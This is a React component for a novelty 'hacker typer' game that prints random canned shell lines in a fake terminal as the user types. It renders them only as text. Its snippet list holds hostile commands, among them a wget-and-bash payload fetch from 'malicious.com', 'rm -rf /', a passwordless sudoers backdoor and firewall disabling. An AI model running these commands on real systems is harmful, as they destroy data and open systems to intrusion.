'use client';

import { useState, useEffect, useRef } from 'react';

export default function HackerTyper({ onClose }: { onClose: () => void }) {
  const [codeLines, setCodeLines] = useState<string[]>([]);
  const [keystrokes, setKeystrokes] = useState(0);
  const [startTime, setStartTime] = useState<number | null>(null);
  const [typingSpeed, setTypingSpeed] = useState(0);
  const [accessLevel, setAccessLevel] = useState('GUEST');
  const [isHacking, setIsHacking] = useState(false);

  const codeSnippets = [
    'ssh -i ~/.ssh/id_rsa user@192.168.1.1',
    'SELECT * FROM users WHERE admin=1;',
    'nmap -sV 192.168.0.0/24',
    'for i in range(1000): exploit(target)',
    'ACCESS GRANTED - ADMIN LEVEL: MAXIMUM',
    'DECRYPTING MAINFRAME... [████████████████] 99%',
    'cd /root && cat flag.txt',
    'INITIATING QUANTUM BACKDOOR...',
    'Password: ****** ACCEPTED',
    'sudo rm -rf / --no-preserve-root',
    'curl -X POST http://target/api/admin --data "exploit"',
    'git push --force origin master',
    'docker run -it --rm alpine sh',
    'kubectl exec -it pod-0 -- /bin/bash',
    'ansible-playbook deploy.yml --extra-vars "env=prod"',
    'terraform apply -auto-approve',
    'grep -r "password" /var/log/',
    'chmod 777 /etc/shadow',
    'crontab -e && echo "*/5 * * * * /bin/bash"',
    'wget http://malicious.com/payload.sh && bash payload.sh',
    'python3 -c "import socket; s=socket.socket(); s.connect((\"target\",443))"',
    'echo "0.0.0.0 facebook.com" >> /etc/hosts',
    'iptables -A INPUT -p tcp --dport 22 -j DROP',
    'systemctl stop firewalld',
    'useradd -m -s /bin/bash hacker',
    'echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
  ];

  const accessLevels = ['GUEST', 'USER', 'MODERATOR', 'ADMIN', 'SUPER_ADMIN', 'ROOT', 'GOD_MODE'];

  useEffect(() => {
    const handleKeyPress = (e: KeyboardEvent) => {
      if (!startTime) {
        setStartTime(Date.now());
        setIsHacking(true);
      }

      setKeystrokes(prev => prev + 1);

      const snippet = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
      setCodeLines(prev => {
        const newLines = [...prev, snippet];
        if (newLines.length > 20) {
          return newLines.slice(-20);
        }
        return newLines;
      });

      // Update access level based on keystrokes
      const newLevelIndex = Math.min(Math.floor(keystrokes / 50), accessLevels.length - 1);
      setAccessLevel(accessLevels[newLevelIndex]);
    };

    window.addEventListener('keydown', handleKeyPress);

    return () => {
      window.removeEventListener('keydown', handleKeyPress);
    };
  }, [startTime, keystrokes]);

  useEffect(() => {
    if (startTime && keystrokes > 0) {
      const elapsed = (Date.now() - startTime) / 1000; // seconds
      const speed = Math.round(keystrokes / elapsed);
      setTypingSpeed(speed);
    }
  }, [keystrokes, startTime]);

  return (
    <div className="fixed inset-0 overflow-hidden bg-black">
      {/* Scanline effect */}
      <div className="absolute inset-0 opacity-10 pointer-events-none">
        <div className="w-full h-full" style={{
          backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 0, 0.1) 2px, rgba(0, 255, 0, 0.1) 4px)',
        }} />
      </div>

      {/* Terminal header */}
      <div className="absolute top-0 left-0 right-0 bg-[#1a1a1a] border-b border-[#00ff00] px-4 py-2 flex items-center justify-between z-10">
        <div className="flex items-center gap-2">
          <div className="w-3 h-3 bg-red-500 rounded-full"></div>
          <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
          <div className="w-3 h-3 bg-green-500 rounded-full"></div>
          <span className="text-[#00ff00] ml-2 font-mono text-sm">HACKER_TERMINAL_v4.20</span>
        </div>
        <div className="flex items-center gap-3">
          <div className="text-[#00ff00] font-mono text-xs">
            <span className="text-gray-400">LEVEL:</span> {accessLevel}
          </div>
          <div className="text-[#00ff00] font-mono text-xs">
            <span className="text-gray-400">SPEED:</span> {typingSpeed} k/s
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => window.location.href = '/games'}
              className="text-[#00ff00] border border-[#00ff00]/50 px-2 py-1 rounded text-xs hover:bg-[#00ff00] hover:text-black font-mono cursor-pointer transition-colors"
            >
              [GAMES]
            </button>
            <button
              onClick={() => window.location.href = '/'}
              className="text-[#00ff00] border border-[#00ff00]/50 px-2 py-1 rounded text-xs hover:bg-[#00ff00] hover:text-black font-mono cursor-pointer transition-colors"
            >
              [HOME]
            </button>
            <button
              onClick={onClose}
              className="text-[#00ff00] border border-[#00ff00] px-3 py-1 rounded text-sm hover:bg-[#00ff00] hover:text-black font-mono cursor-pointer transition-colors"
            >
              [EXIT]
            </button>
          </div>
        </div>
      </div>

      {/* Terminal content */}
      <div className="absolute top-12 left-0 right-0 bottom-12 p-4 font-mono text-sm overflow-hidden">
        <div className="text-[#00ff00] space-y-1">
          {codeLines.map((line, i) => (
            <div key={i} className="opacity-90">
              <span className="text-gray-500 mr-2">{(i + 1).toString().padStart(3, '0')}</span>
              <span className="text-cyan-400">$</span> {line}
            </div>
          ))}
          {/* Blinking cursor */}
          <div className="flex items-center">
            <span className="text-gray-500 mr-2">{(codeLines.length + 1).toString().padStart(3, '0')}</span>
            <span className="text-cyan-400">$</span> <span className="animate-pulse">_</span>
          </div>
        </div>
      </div>

      {/* Stats panel */}
      <div className="absolute top-16 right-4 bg-black/80 border border-[#00ff00]/30 rounded p-3 font-mono text-xs z-10">
        <div className="text-[#00ff00] space-y-1">
          <div><span className="text-gray-400">KEYSTROKES:</span> {keystrokes}</div>
          <div><span className="text-gray-400">ACCESS:</span> {accessLevel}</div>
          <div><span className="text-gray-400">SPEED:</span> {typingSpeed} k/s</div>
          {isHacking && (
            <div className="text-yellow-400 animate-pulse">
              ● HACKING IN PROGRESS
            </div>
          )}
        </div>
      </div>

      {/* Footer */}
      <div className="absolute bottom-0 left-0 right-0 bg-[#1a1a1a] border-t border-[#00ff00] px-4 py-2 text-[#00ff00] font-mono text-xs z-10">
        <p>
          {isHacking 
            ? `>> SYSTEM BREACH DETECTED... KEEP TYPING TO ESCALATE PRIVILEGES [${keystrokes}/300]`
            : '>> START TYPING TO INITIATE HACKING SEQUENCE... PRESS ANY KEY TO BEGIN'}
        </p>
      </div>
    </div>
  );
}
